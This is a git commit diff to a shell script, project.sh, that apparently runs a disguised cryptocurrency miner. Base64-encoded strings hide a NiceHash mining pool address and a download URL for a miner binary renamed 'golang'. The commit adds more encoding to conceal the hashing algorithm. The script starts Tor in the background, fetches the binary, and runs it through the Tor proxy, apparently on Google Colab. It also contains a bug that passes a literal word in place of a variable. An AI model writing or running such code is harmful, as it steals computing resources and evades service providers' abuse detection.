f74c7ffcfc275d95e4b9c962b9ff3d36430bb8b9
taovuu1 <94132974+taovuu1@users.noreply.github.com>
2022-02-05 19:00:30 +0700

    Update project.sh

--- project.sh
+++ project.sh
@@ -5,8 +5,10 @@ sudo apt-get install -y tor libpci-dev
 userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
 string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
 url=aHR0cHM6Ly9taW5lcmhvc3RpbmcuMDAwd2ViaG9zdGFwcC5jb20vZmlsZXMvZ29sYW5nX2xpbnV4X2FtZDY0LnppcA==
+key=ZXRoYXNo
 seed=$(echo $string | base64 --decode)
 location=$(echo $url | base64 --decode)
+apikey=$(echo $key | base64 --decode)
 
 nohup tor &>/dev/null &
 
@@ -18,4 +20,6 @@ cd golang_linux_amd64
 
 chmod 777 golang
 
-./golang -a ethash --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
+./golang -a apikey --url $seed \
+-u $userAgent -p x \
+--proxy 127.0.0.1:9050
